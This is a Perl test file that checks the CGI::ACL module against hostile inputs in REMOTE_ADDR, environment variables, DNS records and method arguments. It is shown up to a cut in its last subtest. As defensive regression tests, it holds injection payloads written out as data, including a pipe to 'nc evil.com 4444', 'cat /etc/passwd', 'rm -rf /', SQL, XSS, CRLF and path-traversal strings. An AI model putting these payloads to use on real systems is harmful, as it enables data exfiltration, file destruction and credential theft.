#!/usr/bin/env perl
# cgi_security.t — penetration tests for CGI::ACL
#
# Simulates hostile HTTP environments by injecting weaponised values into
# REMOTE_ADDR and CGI__ACL__* environment variables, and into every public
# method argument.  Each subtest is labelled with the specific exploit
# mechanism it is probing and the attack vector it validates.
#
# References:
#   OWASP ASVS v4.0 §5   — Validation, Sanitisation, Encoding
#   OWASP ASVS v4.0 §2   — Authentication / IP-spoofing via env injection
#   RFC 1035 §3.1         — FQDN maximum length: 253 characters
#   Perl perlsec          — taint mode, $ENV{} propagation

use strict;
use warnings;
use Carp;	# required: prevents Test::Carp glob-aliasing from clearing Carp::carp

use Test::Most;
use Test::Carp;
use Test::Mockingbird;
use Readonly;

BEGIN { use_ok('CGI::ACL') }

# ── Compile-time constants ────────────────────────────────────────────────────

# RFC 5737 documentation-only addresses (never routable in the wild)
Readonly my $SAFE_IP     => '203.0.113.1';
Readonly my $SAFE_IP_2   => '198.51.100.1';
Readonly my $LOOPBACK    => '127.0.0.1';

# Cloud IP/hostname used by the file-level DNS mock
Readonly my $CLOUD_IP    => '1.2.3.4';
Readonly my $CLOUD_HOST  => 'ec2-1-2-3-4.compute-1.amazonaws.com';

# Attack payloads for REMOTE_ADDR injection
Readonly my $SHELL_META  => '1.2.3.4; cat /etc/passwd';
Readonly my $BACKTICK    => '1.2.3.4`id`';
Readonly my $DOLLAR_SUB  => '1.2.3.4$(whoami)';
Readonly my $PIPE        => '1.2.3.4|nc evil.com 4444';
Readonly my $NEWLINE_IP  => "1.2.3.4\n";
Readonly my $CRLF_IP     => "1.2.3.4\r\n5.6.7.8";
Readonly my $NULL_IP     => "1.2.3.4\x00.evil.com";
Readonly my $SQL_INJECT  => "1.2.3.4'; DROP TABLE sessions; --";
Readonly my $XSS_INJECT  => '<script>alert(1)</script>';
Readonly my $PATH_TRVS   => '../../../etc/passwd';

# 300 chars: safely above the RFC 1035 253-char FQDN limit, anchored with
# a genuine cloud-provider suffix so the length check — not the pattern — fires.
Readonly my $LONG_HOST   => ('a' x 254) . '.compute-1.amazonaws.com';

# 64 KiB non-IP string — must be rejected without catastrophic backtracking or OOM
Readonly my $LONG_ADDR   => 'A' x 65536;

# ── Shared test stubs ─────────────────────────────────────────────────────────

{
	package Test::PenLingua;
	sub new     { my ($class, $cc) = @_; bless { cc => $cc }, $class }
	sub country { $_[0]->{cc} }
}

{
	package Test::DyingLingua;
	sub new     { bless {}, shift }
	sub country { die "simulated DNS failure\n" }
}

# ── File-level DNS mock ───────────────────────────────────────────────────────

# Scope a DNS mock for the entire file so no subtest hits the real network.
# $CLOUD_IP resolves to an AWS hostname; everything else has no PTR record.
my $_dns_guard = mock_scoped 'CGI::ACL::_verified_rdns' => sub {
	my ($ip) = @_;
	return $CLOUD_HOST if defined $ip && $ip eq $CLOUD_IP;
	return undef;
};

# ── Helpers ───────────────────────────────────────────────────────────────────

# Run all_denied() with a given REMOTE_ADDR via a localised env variable.
sub denied_at {
	my ($acl, $addr, %extra) = @_;
	local $ENV{REMOTE_ADDR} = $addr;
	return $acl->all_denied(%extra);
}

# Remove any pre-existing CGI__ACL__* keys from an already-localised %ENV.
sub clean_env {
	delete $ENV{$_} for grep { /\ACGI__ACL__/i } keys %ENV;
}

# =============================================================================
# GROUP 1 — REMOTE_ADDR injection
#
# REMOTE_ADDR is the primary attack surface for CGI::ACL.  An attacker who
# controls a CGI reverse proxy, or who can spoof headers, may inject hostile
# values.  All variations must be rejected by all_denied() returning 1 without
# executing any embedded payload.
# =============================================================================

subtest 'ATTACK: trailing-newline REMOTE_ADDR bypasses $ anchor (fixed: \\z)' => sub {
	# Exploit: Perl's $ matches before a terminating \n, so "127.0.0.1\n"
	# would pass a /$RE{net}{IPv4}$/ check and grant loopback access.
	# \z is the absolute end-of-string anchor and never matches before \n.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, "127.0.0.1\n"), 1, 'trailing-newline loopback rejected (\\z anchor holds)');
	is(denied_at($acl, "$SAFE_IP\n"),  1, 'trailing-newline non-loopback rejected');
};

subtest 'ATTACK: CRLF injection in REMOTE_ADDR (header-splitting probe)' => sub {
	# Exploit: \r\n could inject extra HTTP response headers if REMOTE_ADDR
	# were ever reflected.  The second "IP" after the newline must not be
	# evaluated as an IP — the entire string must fail validation.
	my $acl = CGI::ACL->new()->allow_ip($SAFE_IP_2);
	is(denied_at($acl, $CRLF_IP), 1, 'CRLF-embedded REMOTE_ADDR rejected before any header reflection');
};

subtest 'ATTACK: null-byte in REMOTE_ADDR (C-string termination bypass)' => sub {
	# Exploit: C-library string functions stop at \x00.  The format validator
	# must reject the whole string, not truncate and evaluate "1.2.3.4".
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, $NULL_IP), 1, 'null-byte embedded IP rejected by format validator');
};

subtest 'ATTACK: shell metacharacters in REMOTE_ADDR (command injection probe)' => sub {
	# Exploit: if REMOTE_ADDR were ever passed to system() or 2-arg open(),
	# shell metacharacters would execute arbitrary commands.  The format
	# validator must reject all of these before they enter the data flow.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	for my $payload ($SHELL_META, $BACKTICK, $DOLLAR_SUB, $PIPE) {
		is(denied_at($acl, $payload), 1,
			'shell metachar payload rejected: ' . substr($payload, 0, 30));
	}
};

subtest 'ATTACK: SQL injection string in REMOTE_ADDR' => sub {
	# Exploit: REMOTE_ADDR interpolated into a SQL query without validation.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, $SQL_INJECT), 1, 'SQL injection string rejected as non-IP');
};

subtest 'ATTACK: XSS payload in REMOTE_ADDR' => sub {
	# Exploit: REMOTE_ADDR reflected into an access-denied page without
	# HTML-encoding.  The ACL must reject it at the format stage so it
	# never reaches any output path.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, $XSS_INJECT), 1, 'XSS payload in REMOTE_ADDR rejected');
};

subtest 'ATTACK: path traversal in REMOTE_ADDR' => sub {
	# Exploit: REMOTE_ADDR used to build a file path (e.g. log file named
	# after the IP).  The format validator must reject it before it reaches
	# any file-handling code.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, $PATH_TRVS), 1, 'path traversal in REMOTE_ADDR rejected');
};

subtest 'ATTACK: overlong REMOTE_ADDR (catastrophic backtracking / OOM probe)' => sub {
	# Exploit: a 64 KiB non-IP string fed to a poorly-bounded regex could
	# cause catastrophic backtracking and hang the CGI process.  Regexp::Common
	# patterns are well-anchored, but we confirm the call returns promptly.
	my $acl   = CGI::ACL->new()->allow_ip($LOOPBACK);
	my $start = time();
	my $result = denied_at($acl, $LONG_ADDR);
	my $elapsed = time() - $start;
	is($result, 1, 'overlong REMOTE_ADDR denied');
	ok($elapsed < 5, "evaluated in under 5 s (elapsed: ${elapsed}s)");
};

subtest 'ATTACK: Unicode characters in REMOTE_ADDR' => sub {
	# Exploit: wide characters or multi-byte sequences in REMOTE_ADDR could
	# corrupt length-based checks or confuse locale-sensitive regex engines.
	my $acl    = CGI::ACL->new()->allow_ip($LOOPBACK);
	my $result = eval { denied_at($acl, "\x{e9}vil.host") };
	ok(!$@,        'Unicode REMOTE_ADDR does not throw an exception');
	is($result, 1, 'Unicode REMOTE_ADDR is denied');
};

subtest 'ATTACK: empty-string REMOTE_ADDR (defined-or vs. logical-or regression)' => sub {
	# Exploit: the old code used `|| $DEFAULT_ADDR`, which substituted loopback
	# for any falsy value including "".  Fixed to `// $DEFAULT_ADDR`.
	# An empty string must be rejected as an invalid IP, not silently treated
	# as loopback (which would grant access if loopback is in the allow list).
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, ''), 1, 'empty REMOTE_ADDR denied; loopback not substituted');
};

subtest 'ATTACK: REMOTE_ADDR="0" (falsy string, old || bug)' => sub {
	# Exploit: the old `|| $DEFAULT_ADDR` would silently substitute loopback
	# for the Perl-falsy string "0", granting access when loopback is allowed.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, '0'), 1, '"0" REMOTE_ADDR denied; not substituted with loopback');
};

subtest 'ATTACK: REMOTE_ADDR with trailing comment (format bypass probe)' => sub {
	# Probe: "203.0.113.1 # injected" — the space makes the whole string
	# syntactically invalid as an IP.  Must be rejected entirely.
	my $acl = CGI::ACL->new()->allow_ip($SAFE_IP);
	is(denied_at($acl, "$SAFE_IP # injected"), 1, 'IP with trailing comment rejected');
};

subtest 'ATTACK: out-of-range IPv4 octet in REMOTE_ADDR' => sub {
	# Probe: octets above 255 are not valid IPv4; some naive validators
	# accept them or wrap them modulo 256.
	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	is(denied_at($acl, '999.999.999.999'), 1, 'out-of-range octet rejected');
	is(denied_at($acl, '256.0.0.1'),       1, 'octet 256 rejected');
	is(denied_at($acl, '192.168.1.256'),   1, 'trailing octet 256 rejected');
};

# =============================================================================
# GROUP 2 — Cloud cache injection via environment variables
#
# Object::Configure reads CGI__ACL__KEY environment variables and merges them
# into the constructor's initial state.  Before the 0.10 fix, setting
# CGI__ACL___cloud_cache could pre-seed the DNS cache so that a cloud IP
# appeared non-cloud for the lifetime of the process.
# =============================================================================

subtest 'ATTACK: CGI__ACL___cloud_cache env-var injection (class constructor path)' => sub {
	# Exploit: inject a cache entry marking $CLOUD_IP as non-cloud with a
	# far-future expiry.  If _* stripping is absent, all_denied() consults
	# the injected entry and returns 0 (allow) for the cloud IP.
	local %ENV;
	clean_env();
	$ENV{'CGI__ACL___cloud_cache'} = 'injected';	# value irrelevant; key must be stripped
	$ENV{REMOTE_ADDR} = $CLOUD_IP;

	my $acl = CGI::ACL->new()->deny_cloud();
	ok(!defined($acl->{_cloud_cache}),
		'_cloud_cache env-var injection stripped from class constructor');
	is($acl->all_denied(), 1,
		'cloud IP still denied despite injected _cloud_cache env var');
};

subtest 'ATTACK: CGI__ACL___cidrlist env-var injection (class constructor path)' => sub {
	# Exploit: inject a fabricated CIDR list that contains an allow-everything
	# entry.  If not stripped, the CIDR lookup would allow any IP.
	local %ENV;
	clean_env();
	$ENV{'CGI__ACL___cidrlist'} = 'injected';	# key must be stripped
	$ENV{REMOTE_ADDR} = $SAFE_IP;

	my $acl = CGI::ACL->new()->allow_ip($LOOPBACK);
	ok(!defined($acl->{_cidrlist}),
		'_cidrlist env-var injection stripped from class constructor');
	is(denied_at($acl, $SAFE_IP), 1,
		'non-listed IP denied; fabricated _cidrlist was not used');
};

subtest 'LEGITIMATE: CGI__ACL__deny_cloud env-var (public key passthrough)' => sub {
	# Confirm that stripping _* keys does NOT strip public keys.
	# This is not an attack — it is the documented env-var configuration feature.
	local %ENV;
	clean_env();
	$ENV{'CGI__ACL__deny_cloud'} = 1;
	$ENV{REMOTE_ADDR} = $CLOUD_IP;

	my $acl = CGI::ACL->new();
	is($acl->{deny_cloud}, 1,       'public deny_cloud env-var passthrough preserved');
	is($acl->all_denied(), 1,       'cloud IP denied when deny_cloud set via env var');
};

# =============================================================================
# GROUP 3 — Constructor clone injection (_* key stripping)
#
# An attacker who can call $base->new(key => value) can attempt to inject
# private cache keys into a cloned object.  All _* keys must be stripped.
# =============================================================================

subtest 'ATTACK: _cloud_cache injection via clone constructor' => sub {
	# Exploit: $base->new(_cloud_cache => {...}) pre-seeds the DNS cache so
	# that $CLOUD_IP is marked non-cloud for the lifetime of the clone,
	# silently bypassing deny_cloud().
	my $base  = CGI::ACL->new()->deny_cloud();
	my $clone = $base->new(
		_cloud_cache => { $CLOUD_IP => { result => 0, expires => 9_999_999_999 } },
	);
	ok(!defined($clone->{_cloud_cache}),
		'_cloud_cache stripped from clone constructor params');
	is(denied_at($clone, $CLOUD_IP), 1,
		'cloud IP denied by clone despite injected _cloud_cache');
};

subtest 'ATTACK: _cidrlist injection via clone constructor' => sub {
	# Exploit: inject a CIDR list that contains an allow-everything entry;
	# the clone must re-derive _cidrlist from its own allowed_ips, not accept
	# a caller-supplied one.
	my $base  = CGI::ACL->new()->allow_ip($LOOPBACK);
	my $clone = $base->new(
		_cidrlist => ['0.0.0.0/0'],	# allow-everything — must be stripped
	);
	ok(!defined($clone->{_cidrlist}),
		'_cidrlist stripped from clone constructor params');
	is(denied_at($clone, $SAFE_IP), 1,
		'non-listed IP denied by clone; fabricated _cidrlist not used');
};

subtest 'ATTACK: combined _* injection does not corrupt public state' => sub {
	# Premise: stripping _* keys must not also discard legitimate public keys
	# that appear in the same constructor call.
	my $base  = CGI::ACL->new();
	my $clone = $base->new(
		deny_cloud   => 1,
		_cloud_cache => { $CLOUD_IP => { result => 0, expires => 9_999_999_999 } },
		_cidrlist    => ['0.0.0.0/0'],
	);
	is($clone->{deny_cloud}, 1,         'public deny_cloud preserved through _* stripping');
	ok(!defined($clone->{_cloud_cache}), '_cloud_cache stripped');
	ok(!defined($clone->{_cidrlist}),    '_cidrlist stripped');
};

# =============================================================================
# GROUP 4 — allow_ip() injection / input-validation bypass
#
# Before 0.10, allow_ip() stored any string verbatim and relied on the
# eval-wrapped Net::CIDR calls to silently discard invalid entries.  This
# allowed memory accumulation in persistent processes and presented an O(n)
# cidradd overhead per request.  The fix validates format before storage.
# =============================================================================

subtest 'ATTACK: shell injection string passed to allow_ip()' => sub {
	# Before 0.10: stored verbatim; cidradd died inside eval, silently discarded.
	# After 0.10: rejected at input with carp before storage.
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip('1.2.3.4; cat /etc/passwd') });
	ok(defined($acl->{allowed_ips}), 'allowed_ips initialised (fail-closed) even on invalid input');
	ok(!%{$acl->{allowed_ips}},      'shell injection string not stored in allowed_ips');
};

subtest 'ATTACK: SQL injection string passed to allow_ip()' => sub {
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip("'; DROP TABLE sessions; --") });
	ok(!%{$acl->{allowed_ips}}, 'SQL injection string not stored in allowed_ips');
};

subtest 'ATTACK: XSS payload passed to allow_ip()' => sub {
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip('<script>alert(1)</script>') });
	ok(!%{$acl->{allowed_ips}}, 'XSS payload not stored in allowed_ips');
};

subtest 'ATTACK: path traversal string passed to allow_ip()' => sub {
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip('../../../etc/passwd') });
	ok(!%{$acl->{allowed_ips}}, 'path traversal not stored in allowed_ips');
};

subtest 'ATTACK: null-byte in allow_ip() argument' => sub {
	# Exploit: null bytes can terminate C-library strings.  The format
	# validator must reject the whole value, not truncate it.
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip("1.2.3.4\x00.evil.com") });
	ok(!%{$acl->{allowed_ips}}, 'null-byte IP not stored in allowed_ips');
};

subtest 'ATTACK: overlong string to allow_ip() (log-flooding guard)' => sub {
	# The carp message must truncate the display value to prevent writing a
	# 64 KiB line to the error log on every request.  The truncation limit
	# is 60 chars (plus "..." suffix).
	my $acl = CGI::ACL->new();
	my $msg = '';
	{
		local $SIG{__WARN__} = sub { $msg = $_[0] };
		$acl->allow_ip($LONG_ADDR);
	}
	ok(length($msg) < 200,   'carp message for overlong string is short (no log-flooding)');
	ok(!%{$acl->{allowed_ips}}, 'overlong string not stored in allowed_ips');
};

subtest 'ATTACK: all allow_ip() calls invalid => fail-closed (deny all)' => sub {
	# Exploit: if all allow_ip() calls receive invalid values and allowed_ips
	# stays undef, the early-return guard treats the ACL as unrestricted
	# and allows all traffic (fail-open).  The fix: initialise allowed_ips
	# to {} before format validation so the guard sees "IP restrictions set".
	my $acl = CGI::ACL->new();
	does_carp(sub { $acl->allow_ip('not-an-ip') });
	does_carp(sub { $acl->allow_ip('also-not-an-ip') });

	is(denied_at($acl, $SAFE_IP),  1, 'valid IP denied by fail-closed ACL');
	is(denied_at($acl, $LOOPBACK), 1, 'loopback denied — no implicit exemption');
};

subtest 'ATTACK: allow_ip() chain not broken by invalid input' => sub {
	# allow_ip() must return $self even on invalid input so method chaining
	# continues without a "can't call method on undef" crash.
	my $acl = CGI::ACL->new();
	my $ret;
	does_carp(sub { $ret = $acl->allow_ip('garbage-ip') });
	is($ret, $acl, 'allow_ip returns $self on invalid input (chain preserved)');

	# A valid entry added after the invalid one must work correctly.
	$acl->allow_ip($SAFE_IP);
	is(denied_at($acl, $SAFE_IP),  0, 'valid IP added after invalid one is allowed');
	is(denied_at($acl, $SAFE_IP_2), 1, 'unlisted IP still denied');
};

subtest 'ATTACK: CIDR with out-of-range prefix => cidradd exception caught by eval' => sub {
	# IPv4 prefix /33 is protocol-invalid; cidradd will die.  The eval guard
	# in all_denied() must catch this so the CGI process is not killed.
	# The base address is a valid IPv4 so allow_ip() stores it; the die occurs
	# during _cidrlist construction, not at input time.
	my $acl    = CGI::ACL->new()->allow_ip('192.0.2.1/33');
	my $result = eval { denied_at($acl, '192.0.2.1') };
	ok(!$@,         'invalid prefix /33 does not propagate exception from cidradd eval');
	is($result, 1,  'IP with invalid prefix denied (CIDR list empty after eval catch)');
};

# =============================================================================
# GROUP 5 — Country code injection via lingua mock
#
# The lingua->country() return value is normalised with lc() and compared
# against a hash.  Hostile values must not cause eval injection, path
# traversal, or hash-state corruption — they are plain string lookups.
# =============================================================================

subtest 'ATTACK: XSS payload as country code from lingua->country()' => sub {
	# Exploit: if the country value is reflected in an HTTP response without
	# HTML-entity encoding, XSS results.  The ACL must compare it against the
	# deny/allow sets and deny, never propagating it to output.
	my $acl  = CGI::ACL->new()->deny_country('*')->allow_country('GB');
	my $ling = Test::PenLingua->new('<script>alert(1)</script>');
	is(denied_at($acl, $SAFE_IP, lingua => $ling), 1,
		'XSS country code not in allow list => denied');
	ok(!exists($acl->{allow_countries}{'<script>alert(1)</script>'}),
		'XSS payload never inserted into allow_countries hash');
};

subtest 'ATTACK: shell metacharacters as country code from lingua->country()' => sub {
	# Exploit: shell metacharacters returned by lingua->country() could execute
	# arbitrary commands if the value were passed to system() or 2-arg open().
	# CGI::ACL only performs a hash lookup; the value is never passed to a shell.
	my $acl  = CGI::ACL->new()->deny_country('cn');
	my $ling = Test::PenLingua->new('us; rm -rf /');
	# 'us; rm -rf /' is not 'cn'; deny-list miss => allow.  No command runs.
	is(denied_at($acl, $SAFE_IP, lingua => $ling), 0,
		'shell-metachar country code is a plain string (deny-list miss => allow)');
};

subtest 'ATTACK: null byte in country code from lingua->country()' => sub {
	# Exploit: "GB\x00hax" normalised to "gb\x00hax" must not match "gb" in
	# the allow list.  Perl hash keys are binary-safe so this is a pure
	# key-mismatch test, but we verify the outcome is deny.
	my $acl  = CGI::ACL->new()->deny_country('*')->allow_country('GB');
	my $ling = Test::PenLingua->new("GB\x00hax");
	is(denied_at($acl, $SAFE_IP, lingua => $ling), 1,
		'null-byte in country code does not bypass wildcard-deny');
};

subtest 'ATTACK: wildcard literal "*" returned by lingua->country()' => sub {
	# Exploit: if lingua returns '*', and the code compared it against the
	# deny_countries wildcard sentinel before lowercasing, an attacker might
	# trigger the wildcard-deny branch without being in the allow list.
	# All country codes from lingua are treated as plain strings; only the
	# explicitly stored wildcard sentinel activates default-deny mode.
	my $acl  = CGI::ACL->new()->deny_country('*');
	my $ling = Test::PenLingua->new('*');
	# '*' is falsy-ish only if undef/0/""; '*' is truthy in Perl so it passes
	# the `$country = $country_val or return 1` guard.  lc('*') = '*'.
	# deny_countries->{'*'} IS set (wildcard mode).  allow_countries->{'*'}
	# is NOT set.  Result: deny.
	is(denied_at($acl, $SAFE_IP, lingua => $ling), 1,
		'wildcard "*" from lingua is not a self-grant; deny_country("*") still enforced');
};

subtest 'ATTACK: very long country code from lingua->country()' => sub {
	# Exploit: a 64 KiB country code compared via a hash lookup is O(1) after
	# lc().  No ReDoS or OOM risk, but we confirm timing stays sub-second.
	my $acl   = CGI::ACL->new()->deny_country('cn');
	my $ling  = Test::PenLingua->new('x' x 65536);
	my $start = time();
	my $result = denied_at($acl, $SAFE_IP, lingua => $ling);
	my $elapsed = time() - $start;
	is($result, 0,          'overlong country code is not in deny list => allowed');
	ok($elapsed < 2,        "overlong country evaluated quickly (${elapsed}s)");
};

# =============================================================================
# GROUP 6 — Cloud hostname injection via mock DNS
#
# An attacker controlling a DNS server could return a hostile PTR record.
# CGI::ACL only does string comparison against @CLOUD_PATTERNS — it never
# passes the hostname to shell or file operations.  We verify the RFC 1035
# length guard and that embedded special characters cause no harm.
# =============================================================================

subtest 'ATTACK: PTR record exceeding RFC 1035 253-char limit is rejected' => sub {
	# Exploit: a 300-char hostname that embeds a cloud-provider pattern beyond
	# the 253-char bound.  The length check must fire before any regex matching,
	# preventing a compromised resolver from forcing a cloud match via a very
	# long hostname.
	ok(length($LONG_HOST) > 253, 'precondition: LONG_HOST exceeds 253 chars');
	my $long_guard = mock_scoped 'CGI::ACL::_verified_rdns' => sub { $LONG_HOST };
	my $acl = CGI::ACL->new()->deny_cloud();
	# DNS mock returns $LONG_HOST; RFC 1035 check must reject it => non-cloud => allow
	is(denied_at($acl, $CLOUD_IP), 0,
		'overlong PTR hostname rejected by RFC 1035 check; IP treated as non-cloud');
};

subtest 'ATTACK: PTR record with shell metacharacters (command injection via hostname)' => sub {
	# Exploit: if _is_cloud_host() or any downstream caller ever passed the
	# hostname to system() or 2-arg open(), a PTR like
	# "ec2.amazonaws.com; id" would execute arbitrary commands.
	# CGI::ACL only performs a regex match; the hostname is never shelled.
	my $shell_host = 'ec2-1-2-3-4.compute-1.amazonaws.com; cat /etc/passwd';
	my $inject_guard = mock_scoped 'CGI::ACL::_verified_rdns' => sub { $shell_host };
	my $acl    = CGI::ACL->new()->deny_cloud();
	my $result = eval { denied_at($acl, $CLOUD_IP) };
	ok(!$@, 'shell-metachar PTR hostname does not cause an exception');
	pass('no command was executed; test process alive after shell payload in PTR');
};

subtest 'ATTACK: PTR record with CRLF sequence (header-splitting via DNS)' => sub {
	# Exploit: \r\n in a PTR record could split HTTP headers if the hostname
	# were ever emitted in a response.  CGI::ACL does not output the hostname.
	# We verify no exception is raised.
	my $crlf_host  = "ec2.compute-1.amazonaws.com\r\nX-Injected: pwned";
	my $crlf_guard = mock_scoped 'CGI::ACL::_verified_rdns' => sub { $crlf_host };
	my $acl    = CGI::ACL->new()->deny_cloud();
	my $result = eval { denied_at($acl, $CLOUD_IP) };
	ok(!$@, 'CRLF-embedded PTR hostname does not cause an exception');
};

# =============================================================================
# GROUP 7 — Type confusion attacks on setter methods
#
# Passing unexpected reference types to allow_ip(), deny_country(), and
# allow_country() must produce a carp and return $self — never return undef
# (which would break method chaining with a cryptic "can't call method on
# undefined value" crash).
# =============================================================================

subtest 'ATTACK: arrayref passed to allow_ip() (type confusion)' => sub {
	my $acl = CGI::ACL->new();
	my $ret;
	does_carp(sub { $ret = $acl->allow_ip([$SAFE_IP]) });
	is($ret, $acl, 'allow_ip returns $self on arrayref argument (chain preserved)');
};

subtest 'ATTACK: coderef passed to deny_country() (type confusion)' => sub {
	my $acl = CGI::ACL->new();
	my $ret;
	does_carp(sub { $ret = $acl->deny_country(sub { 'CN' }) });
	is($ret, $acl, 'deny_country returns $self on coderef argument (chain preserved)');
};

subtest 'ATTACK: typeglob passed to allow_country() (glob injection)' => sub {
	my $acl = CGI::ACL->new();
	my $ret;
	does_carp(sub { $ret = $acl->allow_country(\*STDIN) });
	is($ret, $acl, 'allow_country returns $self on glob argument (chain preserved)');
};

# =============================================================================
# GROUP 8 — all_denied() lingua type confusion
#
# The `lingua` argument must be a blessed object with a country() method.
# Passing any other type must carp and return 1 (deny) without an exception.
# =============================================================================

subtest 'ATTACK: scalar string passed as lingua' => sub {
	my $acl = CGI::ACL->new()->deny_country('cn');
	does_carp(sub {
		is(denied_at($acl, $SAFE_IP, lingua => 'not-an-object'), 1,
			'scalar lingua causes deny');
	});
};

subtest 'ATTACK: unblessed hashref passed as lingua' => sub {
	my $acl = CGI::ACL->new()->deny_country('cn');
	does_carp(sub {
		is(denied_at($acl, $SAFE_IP, lingua => { country => 'us' }), 1,
			'unblessed hashref lingua causes deny');
	});
};

subtest 'ATTACK: blessed object without country() method as lingua' => sub {
	# Exploit: a blessed object that does not implement country() causes an
	# unhandled exception without the eval guard inside all_denied().
	my $no_method_ling = bless {}, 'Test::LinguaNoCountry';
	my $acl    = CGI::ACL->new()->deny_country('cn');
	my $result = eval { denied_at($acl, $SAFE_IP, lingua => $no_method_ling) };
	ok(!$@,       'missing country() method does not propagate exception');
	is($result, 1, 'missing country() method causes deny (fail-closed)');
};

subtest 'ATTACK: lingua->country() throws an exception' => sub {
	# Exploit: a lingua whose country() dies would kill the CGI process
	# without the eval guard wrapping the call.
	my $ling   = Test::DyingLingua->new();
	my $acl    = CGI::ACL->new()->deny_country('cn');
	my $result = eval { denied_at($acl, $SAFE_IP, lingua => $ling) };
	ok(!$@,       'dying country() method exception caught by eval guard');
	is($result, 1, 'dying country() causes deny (fail-closed)');
};

# =============================================================================
# GROUP 9 — Private-IP short-circuit boundary
#
# Private-range IPs bypass DNS entirely in _is_cloud_host().  The boundary
# must be exact: IPs just outside the private ranges must still go through
# DNS, while IPs inside must not.
# =============================================================================

subtest 'ATTACK: IP just above 10/8 (public unicast, not RFC 1918)' => sub {
	# 11.0.0.1 is public; it must go through DNS.  Our mock returns undef
	# (no PTR) => non-cloud => deny_cloud check passes => allow.
	my $acl = CGI::ACL->new()->deny_cloud();
	is(denied_at($acl, '11.0.0.1'), 0,
		'11.0.0.1 is public; DNS checked; non-cloud per mock => allow');
};

subtest 'ATTACK: 172.15.255.255 (just below RFC 1918 172.16/12, must not short-circuit)' => sub {
	# 172.15.x is public unicast.  The $PRIVATE_IP_RE must not match it.
	my $acl = CGI::ACL->new()->deny_cloud();
	is(denied_at($acl, '172.15.255.255'), 0,
		'172.15.255.255 is public; DNS checked; non-cloud per mock => allow');
};

subtest 'ATTACK: 172.32.0.1 (just above RFC 1918 172.16/12, must not short-circuit)' => sub {
	my $acl = CGI::ACL->new()->deny_cloud();
	is(denied_at($acl, '172.32.0.1'), 0,
		'172.32.0.1 is public; DNS checked; non-cloud per mock => allow');
};

subtest 'BOUNDARY: private-range IPs bypass DNS and are allowed through cloud check' => sub {
	# Premise: private IPs cannot be cloud-provider addresses.
	# Conclusion: _is_cloud_host short-circuits and returns 0, allowing the
	# request to continue to the next rule (none set here => allow).
	my $acl = CGI::ACL->new()->deny_cloud();
	is(denied_at($acl, '192.168.1.1'), 0, 'RFC 1918 192.168/16 allowed through cloud check');
	is(denied_at($acl, '10.0.0.1'),    0, 'RFC 1918 10/8 allowed through cloud check');
	is(denied_at($acl, '172.16.0.1'),  0, 'RFC 1918 172.16/12 lower bound allowed');
	is(denied_at($acl, '172.31.255.255'), 0, 'RFC 1918 172.16/12 upper bound allowed');
	is(denied_at($acl, '127.0.0.1'),   0, 'IPv4 loopback allowed through cloud check');
};

# =============================================================================
# GROUP 10 — Stale-$@ leakage after exception handling
#
# all_denied() must clear $@ after catching exceptions from the DNS eval block
# and the lingua->country() eval block.  A stale $@ confuses any outer eval
# in the caller and constitutes a subtle security/correctness regression.
# =============================================================================

subtest 'SECURITY: $@ is clear after all_denied() with DNS exception' => sub {
	# Force a DNS exception by making _verified_rdns die within this subtest.
	my $dying_dns = mock_scoped 'CGI::ACL::_verified_rdns' => sub {
		die "simulated resolver failure\n";
	};
	my $acl = CGI::ACL->new()->deny_cloud();

	# Seed $@ to confirm it is not left from a previous eval
	$@ = 'pre-existing stale error';
	my $result = eval { denied_at($acl, $CLOUD_IP) };
	ok(!$@,        'all_denied() does not propagate the DNS die');
	is($result, 0, 'DNS exception treated as non-cloud (fail-safe => allow)');

	# Simulate the caller's outer eval: $@ must be clean
	eval { 1 };
	ok(!$@, '$@ is clean after a successful caller eval following all_denied()');
};

subtest 'SECURITY: $@ is clear after all_denied() with lingua->country() exception' => sub {
	my $ling   = Test::DyingLingua->new();
	my $acl    = CGI::ACL->new()->deny_country('cn');
	my $result = eval { denied_at($acl, $SAFE_IP, lingua => $ling) };
	ok(!$@,        'lingua die does not propagate from all_denied()');
	is($result, 1, 'lingua exception causes deny');

	eval { 1 };
	ok(!$@, '$@ is clean after caller eval following lingua exception');
};

# =============================================================================
# GROUP 11 — Taint mode structural validation
#
# Under perl -T, $ENV{REMOTE_ADDR} is tainted.  We cannot execute tests under
# -T from a normal test runner, but we can verify the detaint regex accepts
# only IP-charset characters so no tainted value can carry forbidden chars.
# =============================================================================

subtest 'SECURITY: detaint regex admits only IP-charset characters' => sub {
	# The capture /\A([0-9A-Fa-f:.]+)\z/ must reject every character outside
	# the IP charset.  These characters are meaningful in shell, SQL, HTTP
	# headers, and file paths — none must survive the detaint step.
	my @forbidden = ('/', ';', '|', ' ', "\n", "\r", '@', '#', '!', '"', "'");
	for my $c (@forbidden) {
		ok("1.2.3${c}4" !~ /\A[0-9A-Fa-f:.]+\z/,
			sprintf('detaint rejects char: %s (ord %d)', ($c =~ /\w/ ? $c : sprintf('\\x%02x', ord($c))), ord($c)));
	}
};

subtest 'SECURITY: valid IPv6 address passes detaint and is accepted' => sub {
	# Verify the detaint regex does not accidentally block valid IPv6 addresses
	# (which contain colons and hex digits, both in the charset).
	my $acl = CGI::ACL->new()->allow_ip('2001:db8::1');
	is(denied_at($acl, '2001:db8::1'), 0, 'valid IPv6 exact-match allowed');
	is(denied_at($acl, '2001:db8::2'), 1, 'different IPv6 address denied');
};

subtest 'SECURITY: allow_ip() accepts CIDR notation with valid IPv6 base' => sub {
	my $acl = CGI::ACL->new()->allow_ip('2001:db8::/32');
	# Exact match will miss (key is '2001:db8::/32'); CIDR lookup may allow
	# addresses inside the /32.  The important thing is no exception is thrown.
	my $result = eval { denied_at($acl, '2001:db8::1') };
